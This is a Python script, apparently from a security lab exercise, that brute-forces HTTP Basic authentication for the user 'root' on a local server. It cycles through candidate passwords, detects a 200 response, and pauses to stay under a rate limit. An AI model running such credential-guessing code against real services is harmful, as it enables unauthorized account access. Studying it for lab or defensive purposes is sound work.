from const import *
import base64
import socket
import itertools
import selectors
import random
import time

class zerg:
    def __init__(self, name: str = ""):
        #self.sel = selectors.DefaultSelector()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.name = name
        self.HOST = "localhost" #"host.docker.internal"
        self.PORT = 8000
        self.alive = True
        self.pws_tried = []
        self.connect()
        self.msg_buffer=""
        self.c=0
        self.found=False
        self.final=None

    def gen_pw(self,len :int):
        pass


    def connect(self):
        """Connect to chat server and setup stdin flags."""
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.HOST, self.PORT))

    def try_pw(self,pw :str):
        """Creates the AuthHeader with the created pw""" #password, not powerword - a priest would help here though
        ID = "root"

        authHead = ID+":"+pw
        authHeadB64 = base64.b64encode(authHead.encode()).decode()

        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\n\n'''  #internet says to use carriage return but not sure why
        
        print("testing pw:",pw)
        self.pws_tried.append(pw)
        msg = httpHeader
        self.send_msg(msg)

    def send_msg(self,msg):
        encoded_msg=str(msg).encode("utf-8")          
        self.s.send(encoded_msg)
        print("sent msg pls respond")
        self.server_response()
        #block waiting for a response
        
    def server_response(self):
        #big buffer >:)
        incoming=""
        while not "\r\n\r\n" in incoming:
            try:
                incoming_raw=self.s.recv(500)
                incoming=incoming+incoming_raw.decode("ascii")
                #print("incoming="+incoming)
                
            except UnicodeDecodeError:
                break
            
        #add newly received contents to already existing buffer
        if  '200' in incoming.split("\n")[0]:
            self.found=True
            print("GOT IT!\nwas it "+self.pws_tried[-1]+"?")
        
        # Check if we got a complete message in the buffer waiting for us

        
            #print("DEBUG: response :\n",el.split("\n")[0]," \nas message number",self.c)
            #maybe calculate the average size of all responses and then if we get a larger one, success? :D


    def extract_from_buffer(self):
        recv_msgs=[]
        if "\r\n\r\n" in self.msg_buffer:
            tmp=self.msg_buffer.split("\r\n\r\n")
            #print("got",len(tmp),"msgs here")
            #Get all the messages except the last (it may be complete but probably not. Leave it in buffer for next round)
            if len(tmp)>1:
               for i in range(0,len(tmp)-1):
                   recv_msgs.append(tmp[i])
                   self.c+=1
                #TODO should verify here if any of the messages is a success!
               #only the remains stay in the buffer.
               self.msg_buffer=tmp[len(tmp)-1]

            for msg in recv_msgs:
                print(msg)
                if  '200' in msg.split("\n")[0]:
                    self.found=True
                    print("GOT IT!\nwas it "+self.pws_tried[-1]+"?")
            return True
        else:
            return False


    def loop(self):
        #main loop
        while self.alive:
            if not self.found:
                print("all your base are belong to us") #nice ref :D

                chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPKRSTUVWXYZ"

                n = 1
                count = 0
                for i in range(1, n+1):
                    for item in itertools.product(chars):
                        if not self.found:
                            self.try_pw(item[0])
                            count+=1
                            if count >4: #target->5
                                #To clear out the received messages even if we're waiting for the cooldown to reset
                                if "\r\n\r\n" in self.msg_buffer:
                                    self.extract_from_buffer()

                                time.sleep(COOLDOWN_TIME/100)
                                count = 0

                                self.connect()
                        else:
                                print("it was "+self.pws_tried[-1])
                                return self.pws_tried[-1]
                
            else:
                break
slave = zerg("joao")
slave.loop()
            
            